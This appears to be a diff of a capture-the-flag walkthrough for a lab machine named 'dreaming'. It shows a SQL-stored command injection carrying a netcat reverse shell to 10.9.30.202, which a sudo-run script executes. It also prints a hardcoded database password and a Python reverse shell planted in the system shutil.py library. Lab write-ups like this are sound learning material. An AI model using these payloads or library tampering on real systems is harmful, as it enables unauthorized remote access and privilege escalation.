@@ -114,7 +114,9 @@ mysql> select * from dreams;
 | Dave    | Becoming a professional musician   |
 +---------+------------------------------------+
 
-mysql> UPDATE dreams  set dreamer = 'id& rm', dream = ' /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.9.30.202 4445 >/tmp/f' WHERE dreamer = 'id& id';
+INSERT INTO dreams (dreamer, dream) VALUES ('id& rm', '/tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.9.30.202 4445 >/tmp/f');
+
+mysql> UPDATE dreams  set dreamer = 'id& rm', dream = ' /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.9.30.202 4445 >/tmp/f' WHERE dreamer = 'id& rm';
 Query OK, 1 row affected (0.01 sec)
 Rows matched: 1  Changed: 1  Warnings: 0
 
@@ -129,10 +131,24 @@ mysql> select * from dreams;
 | id& rm          |  /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.9.30.202 4445 >/tmp/f |
 +-----------------+--------------------------------------------------------------------------------+
 
+<h2>get reverse shell as death </h2>
+
 and run
 lucien@dreaming:~$ sudo -u death /usr/bin/python3 /home/death/getDreams.py
 
-<h2>get reverse shell as death </h2>
+
+<h2>get death password</h2>
+
+death@dreaming:~$ cat getDreams.py 
+import mysql.connector
+import subprocess
+
+# MySQL credentials
+DB_USER = "death"
+DB_PASS = "!mementoMORI666!"
+DB_NAME = "library"
+
+<h2>Enumeration as Death </h2>
 
 run linpeas
 ╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
@@ -154,7 +170,10 @@ backup(src_file, dst_file)
 print("The kingdom backup has been done!")
 
 
+insert reverse shell to /usr/lib/python3.8/shutil.py     
+import os,pty,socket;s=socket.socket();s.connect(("10.x.x.x",4446));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")
+and run listener
 
-
+get Morpehus shell
 
 <\code>
